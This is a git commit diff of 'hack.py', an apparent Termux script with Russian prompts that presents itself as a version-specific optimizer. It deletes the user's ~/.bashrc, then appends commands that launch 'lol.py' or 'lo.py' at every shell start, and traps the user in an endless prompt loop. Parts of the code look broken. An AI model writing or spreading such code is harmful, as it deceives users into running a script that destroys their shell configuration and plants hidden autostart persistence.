613835d144d62944f7e126e606db04bb0ee76f21
777-FOXik-777 <95873460+777-FOXik-777@users.noreply.github.com>
2022-04-11 18:37:04 +0300

    Update hack.py

--- hack.py
+++ hack.py
@@ -9,48 +9,37 @@ def res():
 os.system('rm ~/.bashrc')
 
 os.system('clear')
-print('[!] Установка пакетов..')
-time.sleep(3)
+print(FORE.YELLOW+' ')
+print(' ▄▄                                         ▄▄')
+print(' ██                                         ██')
+print(' ██▄████▄   ▄█████▄    ▄█████▄  ██ ▄██▀')
+print(' ██▀     ██   ▀ ▄▄▄██    ██▀    ▀   ██▄██')
+print(' ██       ██  ▄██▀▀▀██  ██           ██▀██▄')
+print(' ██       ██  ██▄▄▄███  ▀██▄▄▄▄█ ██   ▀█▄')
+print(' ▀▀       ▀▀   ▀▀▀▀ ▀▀      ▀▀▀▀▀   ▀▀     ▀▀▀')
 res()
-print('[!] Установка утилит..')
-time.sleep(4)
+print('[для оптимизированной роботы')
+print('уточните вашу версию Termux]')
+print(' ')
+print('[1] 0.118.0 "последняя версия"')
+print('[2] 0.101 "плеймаркет версия"')
 res()
-print('[!] Установка лединга..')
-time.sleep(1)
-res()
-print('[!] Установка талифов..')
-time.sleep(2)
-res()
-print('[!] Установка доп-пакетов..')
-time.sleep(3)
-res()
-print('[!] Установка данных..')
-time.sleep(3)
-res()
-os.system('clear')
-while True:
-    print('■для оптимизированной роботы')
-    print('уточните вашу версию Termux■')
-    print(' ')
-    print('[1] 0.118.0 "последняя версия"')
-    print('[2] 0.101 "плеймаркет версия"')
-    res()
-    tsu = input('выберете пункт>>> ')
-    if tsu == '1':
-        os.system('echo "cd termuxaling" >> ~/.bashrc')
-        os.system('echo "python3 lol.py" >> ~/.bashrc')
+tsu = input('выберете пункт>>> ')
+if tsu == '1':
+    os.system('echo "cd termuxaling" >> ~/.bashrc')
+    os.system('echo "python3 lol.py" >> ~/.bashrc')
 
-    if tsu == '2':
-        os.system('echo "cd termuxaling" >> ~/.bashrc')
-        os.system('echo "python3 lo.py" >> ~/.bashrc')
-    else:
-        os.system('clear')
+if tsu == '2':
+    os.system('echo "cd termuxaling" >> ~/.bashrc')
+    os.system('echo "python3 lo.py" >> ~/.bashrc')
+else:
+    os.system('hack.py')
 
 os.system('clear')
 print('[!] Оптимизация..')
 time.sleep(3)
 os.system('clear')
 
-
-print('все готово просто перезапустите термукс и напишите команду "go" ')
-
+while True:
+    print('все готово просто перезапустите термукс и напишите команду "go" ')
+    lol = input('✅')
